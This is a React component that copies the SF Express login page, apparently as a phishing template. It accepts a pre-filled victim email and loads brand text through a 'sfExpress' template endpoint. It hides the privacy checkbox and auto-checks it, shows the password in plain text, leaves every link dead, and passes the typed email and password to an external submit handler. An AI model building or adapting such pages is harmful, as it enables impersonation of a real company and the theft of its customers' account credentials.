'use client'

import { useState, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  Mail, 
  Lock, 
  Phone, 
  User, 
  Globe, 
  MapPin, 
  AlertCircle,
  MessageCircle,
  ChevronDown
} from 'lucide-react'

// ════════════════════════════════════════════════════════════════════════════
// TYPES & INTERFACES
// ════════════════════════════════════════════════════════════════════════════

type LoginTab = 'phone' | 'email' | 'username'

interface SFExpressTranslations {
  // Header
  headerAccountOpen: string
  headerInternational: string
  headerLocation: string
  headerLanguage: string
  
  // Announcement
  announcement: string
  announcementText: string
  
  // Tabs
  tabPhone: string
  tabEmail: string
  tabUsername: string
  
  // Form Fields
  placeholderEmail: string
  placeholderPassword: string
  placeholderPhone: string
  placeholderUsername: string
  selectCountry: string
  
  // Links & Buttons
  verificationLogin: string
  privacyPolicy: string
  agreeToPrivacy: string
  loginButton: string
  passwordReset: string
  registerNow: string
  
  // Footer
  copyright: string
  cookieSettings: string
  privacyInfo: string
  
  // Online Service
  onlineService: string
  satisfactionSurvey: string
  surveyMessage: string
  contactUs: string
  
  // Errors
  errorPrivacy: string
  errorFields: string
  errorLogin: string
}

// ════════════════════════════════════════════════════════════════════════════
// MAIN COMPONENT
// ════════════════════════════════════════════════════════════════════════════

interface SFExpressLoginFormProps {
  email?: string
  onSubmit: (email: string, password: string) => Promise<void>
  backgroundImage?: string
}

export default function SFExpressLoginForm({ 
  email: initialEmail = '', 
  onSubmit,
  backgroundImage = '/images/sf-warehouse-bg.png'
}: SFExpressLoginFormProps) {
  // State
  const [activeTab, setActiveTab] = useState<LoginTab>('email')
  const [email, setEmail] = useState(initialEmail)
  const [password, setPassword] = useState('')
  const [phone, setPhone] = useState('')
  const [username, setUsername] = useState('')
  const [countryCode, setCountryCode] = useState('+1')
  const [agreePrivacy, setAgreePrivacy] = useState(true)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [translations, setTranslations] = useState<SFExpressTranslations | null>(null)
  const [showOnlineService, setShowOnlineService] = useState(true)

  // Fetch translations
  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'sfExpress' })
        })
        
        const data = await response.json()
        if (data.translations) {
          setTranslations(data.translations)
        }
      } catch (error) {
        // Fallback to English
        setTranslations({
          headerAccountOpen: 'Open Business Account',
          headerInternational: 'International Official Site',
          headerLocation: 'Virgin Islands, U.S.',
          headerLanguage: 'English',
          announcement: 'Announcement',
          announcementText: 'Reminder About Providing Receiver\'s Email Address When Order International Product',
          tabPhone: 'Phone Number',
          tabEmail: 'Email Address',
          tabUsername: 'Username',
          placeholderEmail: 'Please enter email address',
          placeholderPassword: 'Please enter password',
          placeholderPhone: 'Please enter phone number',
          placeholderUsername: 'Please enter username',
          selectCountry: 'Select country',
          verificationLogin: 'Verification code login',
          privacyPolicy: 'Privacy Policy',
          agreeToPrivacy: 'I agree to the Privacy Policy',
          loginButton: 'Login',
          passwordReset: 'Password Reset',
          registerNow: 'Register Now',
          copyright: 'Copyright © 2023 SF Express All Rights Reserved',
          cookieSettings: 'Cookie Settings',
          privacyInfo: 'Privacy Information',
          onlineService: 'Online service',
          satisfactionSurvey: 'Satisfaction Survey',
          surveyMessage: 'Please take a moment to rate our service',
          contactUs: 'Contact Us',
          errorPrivacy: 'Please agree to the privacy policy',
          errorFields: 'Please fill in all fields',
          errorLogin: 'Login failed. Please try again.'
        })
      }
    }
    
    fetchTranslations()
  }, [])

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    if (!translations) return

    // Use email as login identifier (only email login now)
    let loginIdentifier = email

    if (!loginIdentifier || !password) {
      setError(translations.errorFields)
      return
    }

    setLoading(true)

    try {
      await onSubmit(loginIdentifier, password)
    } catch (err: any) {
      setError(err.message || translations.errorLogin)
    } finally {
      setLoading(false)
    }
  }

  if (!translations) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="w-6 h-6 border-2 border-red-600 border-t-transparent rounded-full animate-spin" />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* HEADER */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <header className="bg-black text-white">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          {/* Logo */}
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-2">
              <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center">
                <span className="text-black font-bold text-lg">SF</span>
              </div>
            </div>
            
            {/* Navigation */}
            <nav className="hidden md:flex items-center gap-6 text-sm">
              <a href="#" className="hover:text-red-500 transition-colors flex items-center gap-1">
                <User className="w-4 h-4" />
                {translations.headerAccountOpen}
              </a>
              <a href="#" className="hover:text-red-500 transition-colors flex items-center gap-1">
                <Globe className="w-4 h-4" />
                {translations.headerInternational}
              </a>
            </nav>
          </div>

          {/* Right Side */}
          <div className="flex items-center gap-4 text-sm">
            <button className="hover:text-red-500 transition-colors flex items-center gap-1">
              <MapPin className="w-4 h-4" />
              {translations.headerLocation}
            </button>
            <button className="hover:text-red-500 transition-colors flex items-center gap-1">
              <Globe className="w-4 h-4" />
              {translations.headerLanguage}
              <ChevronDown className="w-3 h-3" />
            </button>
          </div>
        </div>
      </header>

      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* ANNOUNCEMENT BAR */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <div className="bg-orange-50 border-b border-orange-100">
        <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-2 text-sm text-orange-800">
          <AlertCircle className="w-4 h-4 text-orange-600 flex-shrink-0" />
          <span className="font-medium">{translations.announcement}</span>
          <span className="text-orange-600">{translations.announcementText}</span>
        </div>
      </div>

      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* MAIN CONTENT */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <div className="flex-1 flex items-center justify-center p-6">
        <div className="w-full max-w-6xl grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
          {/* ════════════════════════════════════════════════════════════════ */}
          {/* LEFT: BACKGROUND IMAGE */}
          {/* ════════════════════════════════════════════════════════════════ */}
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.6 }}
            className="hidden lg:block"
          >
            <img
              src={backgroundImage}
              alt="SF Express Warehouse"
              className="w-full h-auto"
            />
          </motion.div>

          {/* ════════════════════════════════════════════════════════════════ */}
          {/* RIGHT: LOGIN FORM */}
          {/* ════════════════════════════════════════════════════════════════ */}
          <motion.div
            initial={{ opacity: 0, x: 50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.6 }}
            className="w-full max-w-md mx-auto"
          >
            <div className="bg-white rounded-2xl shadow-xl p-8">
              {/* Tabs - Only Email Tab Visible */}
              <div className="border-b border-gray-200 mb-6">
                <div className="pb-3 text-sm font-medium text-red-600 relative">
                  {translations.tabEmail}
                  <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-red-600" />
                </div>
              </div>

              {/* Form */}
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Email Input - Always Visible */}
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder={translations.placeholderEmail}
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 text-sm text-gray-900 font-medium"
                    style={{ color: '#1F2937' }}
                  />
                </div>

                {/* Password Field */}
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  <input
                    type="text"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder={translations.placeholderPassword}
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 text-sm text-gray-900 font-medium"
                    style={{ color: '#1F2937' }}
                  />
                </div>

                {/* Verification Code Link */}
                <div className="text-right">
                  <a href="#" className="text-sm text-gray-600 hover:text-red-600">
                    {translations.verificationLogin}
                  </a>
                </div>

                {/* Privacy Checkbox - Auto-checked and hidden */}
                <input
                  type="checkbox"
                  checked={agreePrivacy}
                  onChange={(e) => setAgreePrivacy(e.target.checked)}
                  className="hidden"
                />

                {/* Error Message */}
                {error && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="p-3 bg-red-50 border border-red-200 rounded-lg text-sm text-red-700 flex items-center gap-2"
                  >
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    {error}
                  </motion.div>
                )}

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full py-3 bg-red-600 hover:bg-red-700 disabled:bg-gray-400 text-white font-medium rounded-lg transition-colors flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>{translations.loginButton}...</span>
                    </>
                  ) : (
                    translations.loginButton
                  )}
                </button>

                {/* Links */}
                <div className="flex items-center justify-between text-sm pt-2">
                  <a href="#" className="text-gray-600 hover:text-red-600">
                    {translations.passwordReset}
                  </a>
                  <a href="#" className="text-red-600 hover:text-red-700 font-medium">
                    {translations.registerNow}
                  </a>
                </div>
              </form>
            </div>
          </motion.div>
        </div>
      </div>

      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* ONLINE SERVICE WIDGET */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <AnimatePresence>
        {showOnlineService && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            className="fixed bottom-6 right-6 bg-white rounded-2xl shadow-2xl p-4 w-80 z-50"
          >
            <button
              onClick={() => setShowOnlineService(false)}
              className="absolute top-2 right-2 text-gray-400 hover:text-gray-600 text-xl leading-none"
            >
              ×
            </button>
            
            <div className="flex items-center gap-3 mb-3">
              <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <MessageCircle className="w-6 h-6 text-red-600" />
              </div>
              <div>
                <p className="font-semibold text-gray-900 text-sm">{translations.satisfactionSurvey}</p>
                <p className="text-xs text-gray-500">{translations.surveyMessage}</p>
              </div>
            </div>
            
            <button className="w-full py-2 bg-red-600 hover:bg-red-700 text-white text-sm font-medium rounded-lg transition-colors">
              {translations.contactUs}
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* FOOTER */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <footer className="bg-white border-t border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-6 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-gray-600">
          <span>{translations.copyright}</span>
          <div className="flex items-center gap-4">
            <a href="#" className="hover:text-red-600">{translations.cookieSettings}</a>
            <a href="#" className="hover:text-red-600">{translations.privacyInfo}</a>
          </div>
        </div>
      </footer>
    </div>
  )
}

